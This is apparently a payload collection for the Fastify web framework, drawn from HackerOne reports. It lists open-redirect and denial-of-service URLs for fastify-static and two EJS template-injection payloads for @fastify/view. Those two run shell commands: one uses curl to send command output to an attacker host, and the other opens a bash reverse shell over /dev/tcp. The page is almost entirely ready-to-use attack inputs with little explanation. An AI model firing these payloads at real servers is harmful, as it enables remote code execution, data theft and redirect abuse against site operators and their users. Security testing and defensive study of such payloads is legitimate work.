# Fastify

6 payloads.

### `baaaaf30`

```
GET //target.com/%2e%2e HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Connection: close
```

— [Open redirect in fastify-static via mishandled user's input when attempt to redirect](https://hackerone.com/reports/1354255) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)

### `c8bccb07`

```
http://<domain_name>//target.com/%2e%2e
```

— [Open redirect in fastify-static via mishandled user's input when attempt to redirect](https://hackerone.com/reports/1354255) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)

### `27130058`

```
http://localhost:3000//target.com/%2e%2e
```

— [Open redirect in fastify-static via mishandled user's input when attempt to redirect](https://hackerone.com/reports/1354255) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)

### `c2e7f826`

```
http://localhost:3000//a//target.com/%2e%2e%2f%2e%2e
```

— [1-click DOS in fastify-static via directly passing user's input to new URL() of NodeJS without try/catch](https://hackerone.com/reports/1361804) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)

### `5bb0aec3`

```
<%= require("child_process").execSync("curl http://attacker:8080/`id`") %>
```

**Parameter:** `content`
— [Remote Code Execution via unsafe usage of `reply.view({ raw })` in @fastify/view (EJS template engine)](https://hackerone.com/reports/3122019) · Fastify · [oblivionsage](https://hackerone.com/oblivionsage)

### `f74b0673`

```
<%= require("child_process").execSync("bash -i >& /dev/tcp/attacker.com/4444 0>&1") %>
```

**Parameter:** `content`
— [Remote Code Execution via unsafe usage of `reply.view({ raw })` in @fastify/view (EJS template engine)](https://hackerone.com/reports/3122019) · Fastify · [oblivionsage](https://hackerone.com/oblivionsage)
